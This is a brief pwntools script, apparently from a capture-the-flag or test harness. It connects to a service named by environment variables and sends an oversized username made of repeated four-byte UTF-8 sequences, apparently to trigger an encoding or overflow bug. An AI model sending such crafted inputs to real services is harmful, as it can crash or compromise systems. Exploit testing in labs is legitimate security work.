import os

from pwn import *

p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))

p.recvuntil(b"Enter your username: ")
#p.sendline(b"\x80" * 50)
p.sendline(b"\xf0\x92\x80\x80" * 50)
print(p.recvall(timeout=10).decode(errors="replace"))
